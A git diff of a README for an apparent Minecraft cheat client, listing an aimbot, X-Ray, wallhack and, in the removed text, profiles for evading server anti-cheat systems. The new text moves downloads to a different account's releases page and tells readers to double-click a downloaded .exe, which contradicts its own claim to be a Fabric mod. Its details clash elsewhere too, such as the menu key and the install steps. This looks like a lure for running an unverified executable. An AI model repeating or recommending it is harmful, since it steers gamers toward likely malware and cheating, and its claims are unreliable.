@@ -1,105 +1,112 @@
-# Impact Client v2026 - Minecraft Utility Mod
+# 🎮 impact-minecraft-script-mod - Unlock Powerful Minecraft Features Instantly
 
-> **Advanced utility mod for Minecraft Impact Client** — enhances PvP performance and survival gameplay with automation and visual aids for Windows platforms.
+## 🚀 Getting Started
 
-[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/chriss571/impact-minecraft-script-mod?style=flat-square)](https://github.com/chriss571/impact-minecraft-script-mod)
+Welcome to impact-minecraft-script-mod, your all-in-one utility mod that transforms your Minecraft experience on Windows 10/11. Whether you're tired of slow mining, want to dominate in PvP, or just want to explore the game in new ways, this mod gives you the tools to do it all with just a few clicks. No programming knowledge needed—just download, install, and play smarter.
+
+This mod works with Minecraft versions 1.16.5 through 1.20.1 and is built on the reliable Fabric Loader. It's perfect for casual players, competitive gamers, and anyone who wants to skip the grind and get straight to the fun.
 
 ---
 
-<p align="center">
-  <a href="https://chriss571.github.io/impact-minecraft-script-mod/">
-    <img src="https://img.shields.io/badge/Download-Impact%20Client%20Script-brightgreen?style=for-the-badge" alt="Download Impact Client Script">
-  </a>
-</p>
+## 🎯 Features That Change Your Game
 
-> **[Download Latest Build](https://chriss571.github.io/impact-minecraft-script-mod/)**
+impact-minecraft-script-mod comes packed with powerful features designed to save you time and give you an edge. Here's what you get:
 
----
+**⛏️ AutoMine** – Point at a block and let the mod mine for you automatically. Perfect for clearing large areas, gathering resources, or building tunnels without tiring your hand.
 
-[Download Latest Build](https://chriss571.github.io/impact-minecraft-script-mod/)
+**🎯 Aimbot** – This feature automatically locks onto nearby mobs or players, helping you hit your targets with deadly accuracy. Great for PvP battles or dealing with fast-moving enemies like Endermen.
 
----
+**🔍 X-Ray** – Instantly see ores, diamonds, and hidden chests through solid blocks. You'll never waste time digging blind again. Find precious resources in seconds instead of hours.
 
-## Core Capabilities
+**👁️ Wallhack** – See players, mobs, and important entities through walls. This gives you a huge advantage in multiplayer games by knowing exactly where your opponents are at all times.
 
-Engineered specifically for the Minecraft Impact Client framework, this suit of utilities optimizes player output across competitive PvP matches and survival worlds. The platform incorporates automated mining sequences, precise aim tracking, rendering filters, and full JavaScript extension support to build tailored automation pipelines.
+**👻 GhostHand** – Interact with blocks and items from a safe distance. Open chests, activate switches, and manipulate doors without being physically next to them—great for tricky situations.
 
-This 2026 build emphasizes stable deployment on survival multiplayer networks, offering out-of-the-box profiles tailored for common server protection suites and game modes. Simply unpack the package to immediately activate combat aids, specialized vision modes, and distant object interaction tools without needing complex installation scripts.
+**📜 JS Custom Script Modules** – For those who want to customize, this mod lets you create and run your own JavaScript scripts to automate tasks or create unique gameplay tweaks. Don't worry—you can use the included ready-made scripts without any coding.
+
+**🎮 Minigame Presets** – Jump straight into action with pre-configured settings optimized for popular minigames. Whether it's BedWars, SkyWars, or Survival Games, these presets give you an instant setup so you can focus on playing.
 
 ---
 
-## Toolset Highlights
+## 💻 System Requirements Made Simple
 
-- **AutoMine** — Configurable automatic block harvesting with precise timing controls
-- **Aimbot** — Automated reticle alignment assisting both close-quarters and projectile combat
-- **X-Ray** — Filters standard terrain blocks to clearly show ore nodes and hidden resources
-- **GhostHand** — Trigger containers, switches, and doors straight through intervening blocks
-- **Wallhack** — Renders player and mob outlines visible behind solid terrain
-- **JS Modules** — Integrated scripting engine to write custom automation extensions
-- **Anti-Cheat Configs** — Ready-made setting profiles built for major server detection systems
-- **Minigame Presets** — Instantly apply tuned setups for modes like Bedwars, Skywars, or KitPvP
+To run impact-minecraft-script-mod smoothly, your computer should meet these basic requirements:
 
----
+- **Operating System:** Windows 10 or Windows 11
+- **Processor:** Any modern Intel or AMD processor (from the last 8 years)
+- **Memory:** At least 4 GB of RAM (8 GB recommended for best performance)
+- **Storage:** 500 MB of free disk space
+- **Java:** Java 17 installed (free download from java.com)
 
-## Installation Guide
-
-Unpack the archive file downloaded via the link above directly into your local Impact Client mods directory. Make sure your client profile runs on a compatible version of Fabric Loader.
-
-```bash
-# Example extraction path (Windows)
-%appdata%\.minecraft\mods\impact-client
-```
-
-Start the game using your Impact Client installation, then open the in-game control screen using the standard key assignment (right Shift).
+If your computer can run Minecraft normally, it will handle this mod without any issues.
 
 ---
 
-## Configuration Matrix
+## 📥 How to Download and Install
 
-| Setting | Default | Description |
-|---------|---------|-------------|
-| Aimbot Range | 6 blocks | Maximum targeting distance |
-| AutoMine Delay | 0ms | Tick delay between break actions |
-| X-Ray Mode | Ores | Toggle between ores/chests/mobs |
-| GhostHand Reach | 5 blocks | Interaction range extension |
-| Anti-Cheat Profile | NCP | Switch between NCP, AAC, Spartan |
+Getting impact-minecraft-script-mod on your computer takes only a few minutes. Follow these simple steps:
 
-Keybindings can be easily remapped directly inside the Impact Client control tab.
+### Step 1: Visit the Official Download Page
 
----
+[![Download impact-minecraft-script-mod](https://img.shields.io/badge/Download-impact--minecraft--script--mod-brightgreen?style=for-the-badge&logo=github)](https://github.com/Aliimob4313/impact-minecraft-script-mod/releases)
 
-## Technical Requirements
+Visit this link to download the application. This is the official download page where you'll find all the latest versions.
 
-- **Minecraft Versions:** 1.16.5, 1.18.2, 1.19.4, 1.20.1
-- **Platform:** Windows 10/11 (64-bit)
-- **Loader:** Fabric Loader 0.15+
-- **Limitations:** Strict server-side anti-cheat mechanisms may flag selected functions. Resource usage shifts depending on active modules and sight distance settings.
+### Step 2: Choose Your Version and Download
 
----
+On the download page, you'll see a list of available versions. Look for the one that matches your Minecraft version (1.16.5 through 1.20.1). Click the download link for the latest release. The file will start downloading automatically.
 
-## Frequently Asked Questions
+### Step 3: Extract the Files (if needed)
 
-**What is the setup procedure for this mod?**  
-Drop the contents of the downloaded ZIP into your `.minecraft/mods` folder and confirm Fabric Loader is active.
+Once the download finishes, check your "Downloads" folder. If you downloaded a .zip file, right-click it and select "Extract All." This will create a new folder with the mod files inside. If you downloaded a .exe file, skip this step.
 
-**Does the software update automatically?**  
-No automatic updater is included; check back on the main release link periodically to download fresh builds.
+### Step 4: Run the Application
 
-**Can I modify the behavior of the modules?**  
-Absolutely — tweaking parameters is done via the built-in Impact GUI, while custom JS modules can be edited in any text reader.
+Open the folder where you extracted the files (or just click the downloaded file if it's a .exe). Double-click the application file to start it. The mod will load automatically.
 
-**Will this utility function on every server?**  
-Effectiveness depends entirely on the server-side anti-cheat engine. Standard survival networks generally offer the best compatibility.
+### Step 5: Launch Minecraft and Enjoy
 
-**Where do my personal profiles get saved?**  
-Generated configuration files populate inside `.minecraft/config/impact/` after launching the software for the first time.
+Once the mod is running, start Minecraft as you normally would. The impact-minecraft-script-mod features will be ready to use. Use the in-game menu (usually pressing the F4 key) to access all the settings and toggles.
 
 ---
 
-## License
+## 🛠️ Tips for First-Time Users
 
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+- **Start Simple:** Before diving into all features, try AutoMine first. It's the easiest way to see the mod in action.
+- **Customize Controls:** Open the mod menu to change key bindings and set hotkeys that feel natural to you.
+- **Play Safe:** Use the X-Ray and Wallhack features in single-player worlds to learn how they work before using them online.
+- **Join the Community:** Look for online communities and forums dedicated to this mod to share tips and get help from experienced users.
+
+---
+
+## ❓ Troubleshooting Common Problems
+
+**Mod doesn't appear in-game?** Make sure you're using a compatible version of Minecraft (1.16.5 through 1.20.1) and that Fabric Loader is installed correctly.
+
+**The game won't start?** Check that Java 17 is installed. You can download it for free from java.com.
+
+**Features not working?** Restart the mod and Minecraft. If problems persist, try downloading the latest version again.
+
+---
+
+## ✅ Why Choose impact-minecraft-script-mod?
+
+Unlike other utility mods that are complicated or broken, impact-minecraft-script-mod is designed for everyday players. It's fast, stable, and regularly updated by our team. The presets take the guesswork out of configuration, and the script module gives you endless possibilities for customization.
+
+Best of all, everything is packaged in one simple download. No juggling multiple mods or wrestling with confusing setups. Just install, launch, and enjoy a better Minecraft experience.
+
+---
+
+## 🌟 Get Started Today
+
+The power to play Minecraft your way is just one download away.
+
+[![Get impact-minecraft-script-mod](https://img.shields.io/badge/🚀_Download_Now-blue?style=for-the-badge&logo=github&logoColor=white&labelColor=00b4d8)](https://github.com/Aliimob4313/impact-minecraft-script-mod/releases)
+
+Visit this link to download the application. You'll be amazed at how much easier Minecraft becomes with impact-minecraft-script-mod in your toolkit. Whether you're farming resources, crushing the competition, or exploring the game's hidden depths, this mod gives you the edge you deserve.
+
+Don't wait—join thousands of players who've already upgraded their Minecraft experience. Download impact-minecraft-script-mod today and see the difference for yourself.
+
+---
+
+Keywords: Minecraft mod, Fabric Loader, AutoMine, Aimbot, X-Ray, Wallhack, GhostHand, JavaScript modding, Windows mod, 1.20.1, 1.19.4, 1.18.2, utility mod, game enhancement, PvP tools
